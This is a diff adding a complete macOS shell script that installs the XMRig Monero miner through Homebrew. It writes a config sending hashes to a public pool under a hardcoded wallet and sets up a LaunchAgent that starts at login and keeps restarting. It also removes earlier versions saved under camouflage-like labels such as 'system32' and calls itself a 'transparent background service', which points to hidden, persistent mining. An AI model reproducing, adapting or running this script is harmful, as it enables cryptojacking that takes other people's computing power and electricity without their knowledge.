@@ -1,0 +1,111 @@
+/bin/bash -c '
+set -euo pipefail
+
+echo "=== Installing Monero Miner ==="
+
+# Locate Homebrew
+if command -v brew >/dev/null 2>&1; then
+  BREW="$(command -v brew)"
+elif [ -x /opt/homebrew/bin/brew ]; then
+  BREW=/opt/homebrew/bin/brew
+elif [ -x /usr/local/bin/brew ]; then
+  BREW=/usr/local/bin/brew
+else
+  echo "Homebrew is missing. Install it first."
+  exit 1
+fi
+
+eval "$("$BREW" shellenv)"
+export HOMEBREW_NO_ASK=1
+
+# Install or repair XMRig
+if "$BREW" list --versions xmrig >/dev/null 2>&1; then
+  "$BREW" reinstall xmrig
+else
+  "$BREW" install xmrig
+fi
+
+# Find executable
+XMRIG="$("$BREW" --prefix)/bin/xmrig"
+
+if [ ! -x "$XMRIG" ]; then
+  "$BREW" link xmrig || true
+fi
+
+if [ ! -x "$XMRIG" ]; then
+  echo "XMRig executable is still missing. Installation stopped."
+  "$BREW" list --verbose xmrig
+  exit 1
+fi
+
+# Create configuration and log directories
+CONFIG="$HOME/.config/xmrig/config.json"
+LOG="$HOME/.config/xmrig/miner.log"
+PLIST="$HOME/Library/LaunchAgents/com.user.monerominer.plist"
+UID_NUM="$(id -u)"
+
+mkdir -p "$HOME/.config/xmrig" "$HOME/Library/LaunchAgents"
+
+# Configure wallet and pool
+cat > "$CONFIG" <<EOF
+{
+  "autosave": false,
+  "donate-level": 1,
+  "pools": [
+    {
+      "coin": "monero",
+      "url": "pool.hashvault.pro:443",
+      "user": "43qUaFUkE2KB4qLHALW6H5bPWPSdnn7F4GCzEVyX7CbZCtEmjycx8z2d7ts63ekU7HNXFgsrWgYJkauXXwtcFSXx5cUYF6E",
+      "pass": "macbook-worker",
+      "tls": true,
+      "keepalive": true,
+      "enabled": true
+    }
+  ]
+}
+EOF
+
+# Remove previous versions of this miner service
+for LABEL in com.user.xmrig com.user.monerominer com.user.systemminer com.user.system32; do
+  launchctl bootout "gui/$UID_NUM/$LABEL" 2>/dev/null || true
+done
+
+# Create transparent background service
+cat > "$PLIST" <<EOF
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+  <key>Label</key>
+  <string>com.user.monerominer</string>
+  <key>ProgramArguments</key>
+  <array>
+    <string>$XMRIG</string>
+    <string>--config=$CONFIG</string>
+    <string>--threads=2</string>
+    <string>--cpu-priority=1</string>
+  </array>
+  <key>RunAtLoad</key>
+  <true/>
+  <key>KeepAlive</key>
+  <true/>
+  <key>ThrottleInterval</key>
+  <integer>10</integer>
+  <key>StandardOutPath</key>
+  <string>$LOG</string>
+  <key>StandardErrorPath</key>
+  <string>$LOG</string>
+</dict>
+</plist>
+EOF
+
+plutil -lint "$PLIST"
+launchctl bootstrap "gui/$UID_NUM" "$PLIST"
+
+echo ""
+echo "=== INSTALLATION FINISHED ==="
+echo "Service: Monero Miner"
+echo "Executable: $XMRIG"
+echo "Log: $LOG"
+launchctl list | grep com.user.monerominer || true
+'
